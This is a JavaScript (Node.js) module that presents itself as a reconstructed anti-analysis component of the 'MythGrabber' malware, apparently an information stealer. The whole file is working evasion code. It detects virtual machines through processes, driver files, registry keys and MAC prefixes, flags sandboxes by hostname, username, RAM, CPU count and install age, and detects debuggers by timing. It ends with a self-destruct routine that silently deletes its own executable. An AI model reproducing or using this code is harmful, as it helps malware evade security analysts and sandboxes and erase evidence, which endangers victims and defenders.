/**
 * MythGrabber v140 - Anti-Analysis Module (Reconstructed)
 * 
 * This module contains anti-VM, anti-debug, and anti-sandbox techniques.
 */

const os = require('os');
const fs = require('fs');
const { execSync } = require('child_process');

// VM detection indicators
const VM_INDICATORS = {
    processes: [
        'vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'vmwaretray.exe',
        'vmwareuser.exe', 'vgauthservice.exe', 'vmacthlp.exe', 'vmsrvc.exe',
        'qemu-ga.exe', 'xenservice.exe', 'prl_tools.exe'
    ],
    files: [
        'C:\\Windows\\System32\\drivers\\VBoxMouse.sys',
        'C:\\Windows\\System32\\drivers\\VBoxGuest.sys',
        'C:\\Windows\\System32\\drivers\\VBoxSF.sys',
        'C:\\Windows\\System32\\drivers\\VBoxVideo.sys',
        'C:\\Windows\\System32\\drivers\\vmhgfs.sys',
        'C:\\Windows\\System32\\drivers\\vmci.sys',
        'C:\\Windows\\System32\\drivers\\vmmouse.sys',
        'C:\\Windows\\System32\\drivers\\vmrawdsk.sys',
        'C:\\Windows\\System32\\drivers\\vmusbmouse.sys'
    ],
    registry: [
        'HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions',
        'HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools',
        'HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0'
    ],
    mac_prefixes: [
        '08:00:27', // VirtualBox
        '00:0C:29', // VMware
        '00:50:56', // VMware
        '00:1C:14', // VMware
        '00:15:5D', // Hyper-V
        '00:16:3E'  // Xen
    ],
    hostnames: [
        'SANDBOX', 'VIRUS', 'MALWARE', 'MALTEST', 'TEST', 'SAMPLE',
        'VBOX', 'VIRTUAL', 'VMWARE', 'QEMU', 'XEN'
    ],
    usernames: [
        'SANDBOX', 'VIRUS', 'MALWARE', 'TEST', 'SAMPLE', 'ADMIN',
        'USER', 'CURRENTUSER', 'JOHN', 'JANE', 'ANALYST'
    ]
};

// Check for VM processes
function checkVMProcesses() {
    try {
        const output = execSync('tasklist /FO CSV', { encoding: 'utf8' });
        const processes = output.toLowerCase();
        
        for (const proc of VM_INDICATORS.processes) {
            if (processes.includes(proc.toLowerCase())) {
                return true;
            }
        }
    } catch (e) {
        // Silent fail
    }
    return false;
}

// Check for VM files
function checkVMFiles() {
    for (const file of VM_INDICATORS.files) {
        if (fs.existsSync(file)) {
            return true;
        }
    }
    return false;
}

// Check hostname/username
function checkHostnameUsername() {
    const hostname = os.hostname().toUpperCase();
    const username = os.userInfo().username.toUpperCase();
    
    for (const indicator of VM_INDICATORS.hostnames) {
        if (hostname.includes(indicator)) {
            return true;
        }
    }
    
    for (const indicator of VM_INDICATORS.usernames) {
        if (username === indicator) {
            return true;
        }
    }
    
    return false;
}

// Check MAC address
function checkMACAddress() {
    const interfaces = os.networkInterfaces();
    
    for (const [name, addrs] of Object.entries(interfaces)) {
        for (const addr of addrs) {
            if (addr.mac && addr.mac !== '00:00:00:00:00:00') {
                const macPrefix = addr.mac.substring(0, 8).toUpperCase();
                for (const vmMac of VM_INDICATORS.mac_prefixes) {
                    if (macPrefix === vmMac.toUpperCase()) {
                        return true;
                    }
                }
            }
        }
    }
    
    return false;
}

// Check for debugger (Windows-specific)
function checkDebugger() {
    try {
        // Check if running under debugger via timing
        const start = process.hrtime.bigint();
        for (let i = 0; i < 1000000; i++) { /* busy loop */ }
        const end = process.hrtime.bigint();
        const elapsed = Number(end - start) / 1000000; // ms
        
        // If loop takes too long, likely being debugged
        if (elapsed > 100) {
            return true;
        }
    } catch (e) {
        // Silent fail
    }
    return false;
}

// Check for sandbox indicators
function checkSandbox() {
    // Check for low RAM (sandboxes often have limited resources)
    const totalMemGB = os.totalmem() / (1024 * 1024 * 1024);
    if (totalMemGB < 2) {
        return true;
    }
    
    // Check for few CPUs
    if (os.cpus().length < 2) {
        return true;
    }
    
    // Check for recent system install (sandboxes are often fresh)
    try {
        const systemRoot = process.env.SystemRoot || 'C:\\Windows';
        const stat = fs.statSync(systemRoot);
        const installDate = stat.birthtime;
        const daysSinceInstall = (Date.now() - installDate.getTime()) / (1000 * 60 * 60 * 24);
        
        if (daysSinceInstall < 3) {
            return true;
        }
    } catch (e) {
        // Silent fail
    }
    
    // Check for few files in common directories
    try {
        const desktopFiles = fs.readdirSync(os.homedir() + '\\Desktop');
        const documentsFiles = fs.readdirSync(os.homedir() + '\\Documents');
        
        if (desktopFiles.length < 3 && documentsFiles.length < 3) {
            return true;
        }
    } catch (e) {
        // Silent fail
    }
    
    return false;
}

// Main detection function
function isAnalysisEnvironment() {
    const checks = [
        { name: 'VM Processes', fn: checkVMProcesses },
        { name: 'VM Files', fn: checkVMFiles },
        { name: 'Hostname/Username', fn: checkHostnameUsername },
        { name: 'MAC Address', fn: checkMACAddress },
        { name: 'Debugger', fn: checkDebugger },
        { name: 'Sandbox', fn: checkSandbox }
    ];
    
    for (const check of checks) {
        if (check.fn()) {
            return true;
        }
    }
    
    return false;
}

// Self-destruct function
function selfDestruct() {
    try {
        // Delete the executable
        const exePath = process.execPath;
        
        // Use cmd to delete after process exits
        const cmd = `ping localhost -n 3 > nul & del /f /q "${exePath}"`;
        execSync(`cmd /c start /min cmd /c "${cmd}"`, { windowsHide: true });
        
        process.exit(0);
    } catch (e) {
        process.exit(0);
    }
}

module.exports = {
    VM_INDICATORS,
    checkVMProcesses,
    checkVMFiles,
    checkHostnameUsername,
    checkMACAddress,
    checkDebugger,
    checkSandbox,
    isAnalysisEnvironment,
    selfDestruct
};
